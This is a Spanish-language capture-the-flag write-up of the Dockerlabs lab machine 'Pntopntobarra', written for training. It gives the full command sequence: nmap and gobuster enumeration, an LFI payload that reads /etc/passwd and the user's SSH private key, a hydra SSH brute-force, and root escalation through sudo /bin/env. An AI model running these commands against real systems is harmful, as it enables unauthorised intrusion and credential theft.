
# Writeup Template: Maquina `[Pntopntobarra]`

- Tags: #Pntopntobarra
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Pntopntobarra ](https://mega.nz/file/AXEATCAT#fDXuqEr2xZUx_mu2mG_2LucVDPBo6mcT8YR8zQEHqeI)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x pntopntobarra.zip
sudo bash auto_deploy.sh pntopntobarra.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000 

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.61 ((DebianSid))
```
---

## Enumeracion de [Servicio  Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
 nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No repota nada critico
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back.backup,sh,txt
```

- **Hallazgos**:
```bash
/index.php (Status: 200) [Size: 1534]
```

Tenemos este parametro que verificaremos si es vulnerable:
```bash
172.17.0.2/ejemplos.php?images=./ejemplo1.png
```

Intentaremos probar un **LFI**:
```bash
http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

Logrando tener exito:
```bash
http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

Tenemos capacidad de listar los archivos del sistema, Detectamos este usuario del sistema:
```bash
nico:x:1000:1000:,,,:/home/nico:/bin/bash
```

### Credenciales Encontradas
- Usuario: `[ nico ]`
- Contraseña: `[  ]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una ves detectado este usuario usaremos **hydra** para realizar un ataque de fuerza bruta por **ssh** para este usuario:

### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -l nico -P /usr/share/wordlists/rockyou.txt -f -t 64 ssh://172.17.0.2
```

Tenemos la contrasena de este usuario:
```bash
login: nico password: lovely
```

Por alguna razon no nos otorga acceso lo que aremos es ver su clave: **( id_rsa )** de este usuario, Para despues intentar conectarnos con su llave
```bash
view-source:http://172.17.0.2/ejemplos.php?images=../../../home/nico/.ssh/id_rsa
```

Ahora que podemos verla nos copiamos esa clave para crear un archivo:
```bash
touch id_rsa # Aqui metemos el contenido
chmod 600 id_rsa
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh -i id_rsa nico@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l
```

```bash
User nico may run the following commands on 9cc9c559a864:
    (ALL) NOPASSWD: /bin/env
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /bin/env ]`
- Credenciales de usuario: `[ nico ]:[ ]`

### Explotacion de Privilegios

###### Usuario `[ Nico ]`:

```bash
# Comando para escalar al usuario: ( root )
sudo -u root /bin/env /bin/bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@9cc9c559a864:/home/nico# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar un **LFI**
2. Aprendimos a extraer la clave privada: **( id_rsa )** atraves de un **LFI**

## Recomendaciones de Seguridad
- Proteger el sistema contra ataques **LFI**